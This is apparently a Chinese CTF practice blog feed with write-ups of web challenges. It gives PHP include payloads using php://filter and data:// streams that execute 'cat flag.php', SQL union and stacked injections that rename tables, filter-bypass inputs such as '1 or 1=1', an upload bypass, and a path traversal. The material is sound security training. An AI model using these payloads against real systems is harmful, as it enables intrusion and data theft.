<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=?&gt;&lt;?=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>或者payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h1 id="WEB34"><a href="#WEB34" class="headerlink" title="WEB34"></a>WEB34</h1><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="WEB35"><a href="#WEB35" class="headerlink" title="WEB35"></a>WEB35</h1><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="WEB36"><a href="#WEB36" class="headerlink" title="WEB36"></a>WEB36</h1><p>这里过滤了0-9，所以不能用数字了</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="WEB32-36通用解"><a href="#WEB32-36通用解" class="headerlink" title="WEB32-36通用解"></a>WEB32-36通用解</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="WEB37"><a href="#WEB37" class="headerlink" title="WEB37"></a>WEB37</h1><p>这里的关键是<a href="https://www.php.cn/php-weizijiaocheng-370455.html">include函数</a>，include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。<br>伪协议中的<code>data://</code>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://协议用法：</span><br><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: c=data://text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;  //查看flag.php，右键源码中查找flag</span><br><span class="line">payload: c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKT8+</span><br><span class="line">                          //&#x27;base64,&#x27;后面是base64加密的&lt;?php system(&#x27;cat flag.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="WEB38"><a href="#WEB38" class="headerlink" title="WEB38"></a>WEB38</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了flag，php，file。所以用WEB37中的第二种payload</p>
<h1 id="WEB39"><a href="#WEB39" class="headerlink" title="WEB39"></a>WEB39</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p>
<p>payload和WEB37一样</p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题记录-6</title>
    <url>/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/</url>
    <content><![CDATA[<h1 id="WEB171"><a href="#WEB171" class="headerlink" title="WEB171"></a>WEB171</h1><p>很经典的联合注入，这次相当于又复习了一遍，感觉以前的都忘了，好难过。</p>
<p>详细方法见sqlilabs中的第一关讲解</p>
<h1 id="WEB172"><a href="#WEB172" class="headerlink" title="WEB172"></a>WEB172</h1><p>与171相比，仅仅多了一个table，还是联合注入</p>
<span id="more"></span>

<h1 id="WEB173"><a href="#WEB173" class="headerlink" title="WEB173"></a>WEB173</h1><p>与171相比多了两个table，还是联合注入</p>
<h1 id="萌新计划web1"><a href="#萌新计划web1" class="headerlink" title="萌新计划web1"></a>萌新计划web1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>方法很多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘1000’</span><br><span class="line">“1000”</span><br><span class="line">123&lt;&lt;3</span><br><span class="line">680|320</span><br><span class="line">16进制（0x3e8）</span><br><span class="line">999+1</span><br><span class="line">10*100</span><br><span class="line">999-(-1)/999–1/999- -1</span><br><span class="line">(1000)</span><br><span class="line">144^888（MySQL会报错，但也能执行）按位异或</span><br><span class="line">~~1000 (双重取反)</span><br><span class="line">0b1111101000（二进制）</span><br><span class="line">1 or 1=1%23（万能密码显示所有）</span><br><span class="line">id#（显示所有）</span><br><span class="line">看下一道题的过滤，应该是！、\、/、&gt;、hex可以绕过，不知道怎么弄</span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>题目说是有过滤，所以我们浅浅的Fuzz一下，爆破设置如下</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220302173225420.png" alt="image-20220302173225420"></p>
<p>由于老是出现访问过快的错误，所以这里要用到延时爆破，</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220302173055752.png" alt="image-20220302173055752"></p>
<p>爆破结果如下的均为以过滤字符</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220302173138866.png" alt="image-20220302173138866"></p>
<p>因为过滤了老多字符，所以这里我们用<a href="https://www.freebuf.com/articles/web/264593.html">双写绕过</a>，又因为这里过滤了or，所以order的双写不能是oorderrder，这里要用oorrder，然后接下来就是常规的联合注入，难度不大。</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220302174007100.png" alt="image-20220302174007100"></p>
<p>之后就不一一解释了，但要注意的是，flag没在当前库，这里还要查看其他库</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220302174719700.png" alt="image-20220302174719700"></p>
<p>此题亮点就是双写注入。</p>
<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>用diresearch扫一下后台，这里我用win的扫，一直弹屏，属实怕了，所以改用了kali系统进行扫描，结果有flag.php进去空页，还有index.php.bak进入后下载源码。这里又学到了一个新技巧，在指令尾部加上-e php可以只扫描php语言的文件，大大节约了时间</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数</a>，这题是弱比较，只需让key=123即可，最终payload为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://82388c3e-bc0a-4120-9fb5-a60a3aea7573.node4.buuoj.cn:81/?key=123</span><br></pre></td></tr></table></figure>

<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>首先尝试联合注入，然后发现提示 do not hack me! 这必是有过滤，所以我们Fuzz一下过滤的字符，结果如下</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220303180050773.png" alt="image-20220303180050773"></p>
<p>判断字段数为3后，发现没有回显点，所以放弃联合注入</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220303180147302.png" alt="image-20220303180147302"></p>
<p>本以为是报错注入，可是连括号都过滤了，看了一眼别人的wp，放弃了，呜呜呜</p>
<h1 id="WEB151"><a href="#WEB151" class="headerlink" title="WEB151"></a>WEB151</h1><p>前端绕过文件格式验证</p>
<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220305170944353.png" alt="image-20220305170944353"></p>
<p>不过连接后，flag可不好找，我们用<code>find / -name &quot;flag.*&quot;</code>寻找会更快，这里有许多文件访问被拒绝，所以内容比较多，最终可摘取3个结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">/tmp/flag.sh</span><br><span class="line"></span><br><span class="line">/tmp/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220305171333948.png" alt="image-20220305171333948"></p>
<p>每个都cat一下，最终得到flag</p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题记录-1</title>
    <url>/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="HCTF2018-WarmUp"><a href="#HCTF2018-WarmUp" class="headerlink" title="HCTF2018 WarmUp"></a>HCTF2018 WarmUp</h1><p>这道题还是挺有意思的，不过还没完全吃透，看着别人的WP勉强能看懂一点。</p>
<p>按F12发现存在source.php，进入页面后发现源码</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// highlight_file() 函数对文件进行语法高亮显示。</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span>//定义<span class="title">emmm</span>类①</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)//将传入的参数（这里是<span class="title">file</span>）赋给<span class="title">page</span>②</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//定义whitelist白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) <span class="comment">//非定义或者非字符③</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) <span class="comment">//变量page在变量whitelist的白名单内④</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );<span class="comment">//过滤?</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);<span class="comment">//url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );<span class="comment">//过滤?</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="comment">//checkFile检验</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) <span class="comment">//变量file非空，为字符串，且能通过checkFile的检验</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];⑥</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>①class定义类<a href="http://c.biancheng.net/view/7492.html#:~:text=%E5%9C%A8%20PHP%20%E4%B8%AD%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%20class%20%E5%85%B3%E9%94%AE%E5%AD%97%E5%8A%A0%E7%B1%BB%E5%90%8D%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8%E5%A4%A7%E6%8B%AC%E5%8F%B7%20%7B,%7D%20%E5%B0%86%E5%9C%A8%E7%B1%BB%E4%BD%93%E4%B8%AD%E5%AE%9A%E4%B9%89%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E5%8C%85%E8%A3%B9%E8%B5%B7%E6%9D%A5%EF%BC%8C%E7%B1%BB%E7%9A%84%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F%E5%A6%82%E4%B8%8B%EF%BC%9A%20%5B%E4%BF%AE%E9%A5%B0%E7%B1%BB%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%5D%20class%20%E7%B1%BB%E5%90%8D%20%7B">详细解释</a></p>
<p>②static是定义<a href="https://www.jianshu.com/p/ab5749914f7c">静态变量</a>，function<a href="https://www.php.cn/php-notebook-178152.html">定义函数</a>。</p>
<p>③<a href="https://www.runoob.com/php/php-isset-function.html">isset</a>判断变量是否定义，is_string判断是否为字符串。</p>
<p>④<a href="https://www.w3school.com.cn/php/func_array_in_array.asp">in_array</a>的详细用法</p>
<p>⑤<a href="https://www.runoob.com/php/func-string-mb_substr.html">mb_substr</a>和<a href="https://www.w3school.com.cn/php/func_string_strpos.asp">mb_strpos</a>的详细用法</p>
<p>⑥<a href="https://www.php.cn/php-ask-432688.html#:~:text=php%E4%B8%ADinclude%E7%9A%84%E7%94%A8%E6%B3%95.%20include%20%EF%BC%88%E6%88%96%20require%EF%BC%89%E8%AF%AD%E5%8F%A5%E4%BC%9A%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E6%9C%AC%2F%E4%BB%A3%E7%A0%81%2F%E6%A0%87%E8%AE%B0%EF%BC%8C%E5%B9%B6%E5%A4%8D%E5%88%B6%E5%88%B0%E4%BD%BF%E7%94%A8%20include%20%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%AD%E3%80%82.%20%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E5%BE%88%E6%9C%89%E7%94%A8%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%82%A8%E9%9C%80%E8%A6%81%E5%9C%A8%E7%BD%91%E7%AB%99%E7%9A%84%E5%A4%9A%E5%BC%A0%E9%A1%B5%E9%9D%A2%E4%B8%8A%E5%BC%95%E7%94%A8%E7%9B%B8%E5%90%8C%E7%9A%84%20PHP%E3%80%81HTML,PHP%20%E6%96%87%E4%BB%B6%EF%BC%88%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%A7%E8%A1%8C%E5%AE%83%E4%B9%8B%E5%89%8D%EF%BC%89%E3%80%82.%20include%20%E5%92%8C%20require%20%E8%AF%AD%E5%8F%A5%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%EF%BC%8C%E9%99%A4%E4%BA%86%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%96%B9%E9%9D%A2%EF%BC%9A.%20require%20%E4%BC%9A%E7%94%9F%E6%88%90%E8%87%B4%E5%91%BD%E9%94%99%E8%AF%AF%EF%BC%88E_COMPILE_ERROR%EF%BC%89%E5%B9%B6%E5%81%9C%E6%AD%A2%E8%84%9A%E6%9C%AC.">include</a>的使用</p>
<p>首先尝试<code>/?file=source.php</code>页面返回的仅仅是又打印了一边source.php中的源码，接着尝试</p>
<p><code>/?file=hint.php</code>发现页面底部出现了flag在ffffllllaaaagggg的字样。然后尝试</p>
<p><code>/?file=hint.php?../ffffllllaaaagggg</code>至于这里的?我现在还是不太懂，然后逐渐增加../的数量，增加到第5个时，flag出现。</p>
<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>首先要了解一下PHP中的<a href="https://www.php.net/manual/zh/language.types.array.php">数组</a>，以及<a href="https://www.runoob.com/php/php-var_dump-function.html">var_dump函数</a>。</p>
<p>这里要用到堆叠注入</p>
<p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<p>摘自：</p>
<p>作者：dawsonenjoy<br>链接：<a href="https://www.jianshu.com/p/c50ced83414d">https://www.jianshu.com/p/c50ced83414d</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p>用Hackerbar，不要直接在输入框里输，会过滤。</p>
<p>经过判断后，闭合方式为单引号。</p>
<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p>判断判断字段数，结果为2。</p>
<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p>接着用union 和select爆库，结果发现select被过滤了，不能用</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202194305288.png" alt="image-20220202194305288"></p>
<p>这里要用到<code>show databases</code>，注意与<code>select database()</code>的区别，前者是显示所有数据库名称，后者是显示当前数据库名称。</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202194436341.png" alt="image-20220202194436341"></p>
<h2 id="爆表，爆字段"><a href="#爆表，爆字段" class="headerlink" title="爆表，爆字段"></a>爆表，爆字段</h2><p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202201329717.png" alt="image-20220202201329717"></p>
<p>words表中的字段</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202202215263.png" alt="image-20220202202215263"></p>
<p>1919810931114514中的字段</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202202305894.png" alt="image-20220202202305894"></p>
<h2 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h2><p>根据words中字段的回显，有很大可能输入的数为id，然后猜测语句为</p>
<p><code>select id,data from words where id=</code></p>
<p>根据<code>1&#39; or 1=1--+</code>的回显，可得words表为</p>
<table>
<thead>
<tr>
<th>id</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>hahahah</td>
</tr>
<tr>
<td>2</td>
<td>miaomiaomiao</td>
</tr>
<tr>
<td>114514</td>
<td>ys</td>
</tr>
</tbody></table>
<p>所以，我们把表名1919810931114514改为words然后查询flag即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename table `words` to `words0`; </span></span><br><span class="line"><span class="string">rename table `1919810931114514` to `words`;</span></span><br><span class="line"><span class="string"> alter table `words` change `flag` `id` varchar(100);</span></span><br></pre></td></tr></table></figure>

<p>然后用<code>1&#39; or 1=1;--+</code>查询的flag</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202224533519.png" alt="image-20220202224533519"></p>
<h1 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h1><p>scrabble的用法请见<a href="https://harbeter.github.io/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/">这里</a>。用docker搭建测试环境后，用Ubuntu打开物理机的IP v4地址。</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202225656448.png" alt="image-20220202225656448"></p>
<p>然后用scrabble直接获取源码，得到flag。</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220202234437902.png" alt="image-20220202234437902"></p>
<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>首先尝试了一波判断闭合方式，结果发现越来越不对劲，有三种回显，要么空，要么是数组，要么就是Nonono，然后尝试了堆叠注入，发现果然行！！！但是最后用到<code>show columns from Flag</code>却回显Nonono，初步判断有字符过滤，于是用Fuzz字典判断一下过滤的字符，结果如下</p>
<table>
<thead>
<tr>
<th>handler</th>
</tr>
</thead>
<tbody><tr>
<td>like</td>
</tr>
<tr>
<td>sleep</td>
</tr>
<tr>
<td>delete</td>
</tr>
<tr>
<td>or</td>
</tr>
<tr>
<td>insert</td>
</tr>
<tr>
<td>&amp;</td>
</tr>
<tr>
<td>&amp;&amp;</td>
</tr>
<tr>
<td>handler</td>
</tr>
<tr>
<td>INFORMATION</td>
</tr>
<tr>
<td>xor</td>
</tr>
<tr>
<td>AND</td>
</tr>
<tr>
<td>CREATE</td>
</tr>
<tr>
<td>from</td>
</tr>
<tr>
<td>“</td>
</tr>
</tbody></table>
<p>然后又进行了一番尝试，发现2和2;返回值不一样，说明<strong>输入的值被嵌入了某个语句中</strong>。</p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>PIPES_AS_CONCAT：将【||】原本的“或”转换为“连接字符”，就是将||前后进行拼接</p>
<p>使用方法：PayLoad1【1;set sql_mode=PIPES_AS_CONCAT;select 1】</p>
<p>拼接过后的结果就是【select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag】</p>
